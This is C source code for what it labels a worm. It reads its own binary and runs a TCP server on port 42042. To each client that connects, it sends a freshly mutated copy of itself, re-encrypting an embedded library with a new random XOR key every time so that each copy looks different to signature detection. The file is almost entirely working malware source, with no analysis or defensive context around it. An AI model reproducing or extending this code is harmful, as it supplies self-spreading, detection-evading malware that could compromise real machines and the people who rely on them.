#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#include "globals.h"

#define MAX_PATH_LEN 256
#define PORT 42042
#define SA struct sockaddr

struct thread_args{
    Globals *global;
    int cfd;
    size_t filesize;
    char*file_buffer;
};

// static variables to hold a copy of the worm
char* get_filepath(Globals *global, char*filename, char*buffer);
void get_file_bytes(Globals *global, char* filepath, char **buffer, size_t*filesize);
void* handle_connection(void*varg);
void start_server(Globals *global, char **copy_buffer, size_t*filesize);
int propagate(Globals *global, char* wormpath);

// Get filepath of executable itself
char* get_filepath(Globals *global, char*filename, char*buffer){
    if(filename[0] == '/'){
        buffer = filename;
        return buffer;
    }
    char*cwd = global->getcwd(NULL, MAX_PATH_LEN - global->strlen(filename));

    global->snprintf(buffer, MAX_PATH_LEN-1, "%s/%s", cwd, filename);
    global->free(cwd);
    global->realpath(filename, buffer);

    return buffer;
}


void get_file_bytes(Globals *global, char* filepath, char **buffer, size_t*filesize){
    FILE *fileptr;

    fileptr = global->fopen(filepath, "rb");  // Open the file in binary mode
    global->fseek(fileptr, 0, SEEK_END);      // Jump to the end of the file
    *filesize = global->ftell(fileptr);       // Get the current byte offset in the file
    global->rewind(fileptr);                  // Jump back to the beginning of the file

    *buffer = (char *)global->malloc(*filesize * sizeof(char)); // Enough memory for the file
    global->fread(*buffer, *filesize, 1, fileptr); // Read in the entire file
    global->fclose(fileptr); // Close the file
}

uint64_t random_key(Globals *global){
    uint64_t key = 0;
    int i=0;
    while(i < 8){
        int r = global->rand();
        char c = *(char *)&r;
        if(c != 0){
            ((char *)&key)[i] = c;
            i++;
        }
    }
    return key;
}

void mutate_lib(Globals* global, char*file_buffer){
    global->fprintf(global->stdout, "Mutate the virus!\n");
    MaLib *lib = global->lib;
    uint64_t key = random_key(global);
    global->fprintf(global->stdout, "🎲Change key from (%lx) --to--> ", *(uint64_t *)(file_buffer+lib->elf_offset_key));

    // copy the unencrypted data
    global->memcpy((void *)(file_buffer+lib->elf_offset_data), global->lib_mem, lib->data_length);
    
    // encrypt the data with the new key
    global->xor_memory((void *)(file_buffer+lib->elf_offset_data), lib->data_length, (char*)&key);
    
    // write the new key to the new file
    *(uint64_t *)(file_buffer+lib->elf_offset_key) = key;
    global->fprintf(global->stderr, "(%lx)🎲\n", *(uint64_t *)(file_buffer+lib->elf_offset_key));
}

void* handle_connection(void*varg)
{
    struct thread_args * args = varg;
    Globals *global = args->global;
    int cfd = args->cfd;

    mutate_lib(global, args->file_buffer);
    global->write(cfd, args->file_buffer, sizeof(char) * args->filesize);
    global->close(cfd);
    global->pthread_exit(NULL);
    return NULL;
}

void start_server(Globals *global,char **copy_buffer, size_t*filesize){
    int sockfd, connfd, len;
    struct sockaddr_in servaddr, cli;

    sockfd = global->socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd == -1){
        global->fprintf(global->stderr, "Socket creation failed...\n");
        global->exit(0);
    }
    else{
        //global->fprintf(global->stdout, "Socket successfully created...\n");
    }

    //bzero(&servaddr, sizeof(servaddr));

    // Assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = global->htonl(INADDR_ANY);
    servaddr.sin_port = global->htons(PORT);

    int yes=1;
    if(global->setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &yes, sizeof(yes)) == -1){
        global->fprintf(global->stderr, "Setsockopt failed...\n");
        global->exit(0);
    }

    if((global->bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0){
        //global->fprintf(global->stderr, "Socket bind failed...\n");
        global->exit(0);
    }else{
        //global->fprintf(global->stdout, "Socket bind successful...\n");
    }

    if((global->listen(sockfd, 5)) != 0){
        global->fprintf(global->stderr, "Listen failed...\n");
        global->exit(0);
    }else{
        //global->fprintf(global->stdout, "Server listening...\n");
    }

    len = sizeof(cli);
    while(1){
        connfd = global->accept(sockfd, (struct sockaddr*)&cli, &len);
        if(connfd < 0){
            global->fprintf(global->stderr, "Server accept failed...\n");
            global->exit(0);
        }
        //global->fprintf(global->stdout, "Client connected!\n");
        
        pthread_t thread_id;
        struct thread_args *args = (struct thread_args*)global->malloc(sizeof(struct thread_args));
        args->cfd = connfd;
        args->global = global;
        args->file_buffer = *copy_buffer;
        args->filesize = *filesize;
        global->pthread_create(&thread_id, NULL, handle_connection, args);
    }
    global->close(sockfd);
}

int entry(Globals *global){
    char msg_start[] = "🪱🍎🪱🍎🪱 Start to eat your apples! 🪱🍏🪱🍏🪱\n";
    global->fprintf(global->stdout, msg_start);
    // get the filepath of the executing binary
    char *filepath = global->malloc(MAX_PATH_LEN);
    filepath = get_filepath(global, global->exec_path, filepath);

    // const char msg_path[] = "My path is: %s\n";
    // global->fprintf(global->stdout, msg_path, filepath);
    
    char*file_buffer;
    size_t filesize;
    // load the file content into the global buffer
    get_file_bytes(global, filepath, &file_buffer, &filesize);

    // TODO: manipulate embedded binary in file_buffer

    start_server(global, &file_buffer, &filesize);

    //free(b64);
    global->free(file_buffer);
    global->free(filepath);
    return 1;
}
